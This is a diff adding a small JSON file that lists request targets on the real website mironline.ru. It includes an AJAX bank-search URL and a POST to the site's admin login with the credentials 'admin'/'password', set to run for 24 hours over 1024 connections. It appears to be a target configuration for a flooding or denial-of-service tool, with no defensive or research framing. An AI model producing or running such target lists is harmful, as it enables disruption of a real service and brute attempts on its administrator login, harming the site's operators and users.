@@ -1,0 +1,20 @@
+[
+    {
+        "url": "https://mironline.ru/ajax/ajaxBanks.php?srh=+&ppg=10&sra=&tos=&loyalty-mir=false"
+    },
+    {
+        "url": "https://mironline.ru/mirconf/?login=yes",
+        "method": "POST",
+        "body": {
+            "AUTH_FORM": "Y",
+            "TYPE": "AUTH",
+            "USER_LOGIN": "admin",
+            "USER_PASSWORD": "password"
+        },
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "duration": "24h",
+        "connections": 1024
+    }
+]
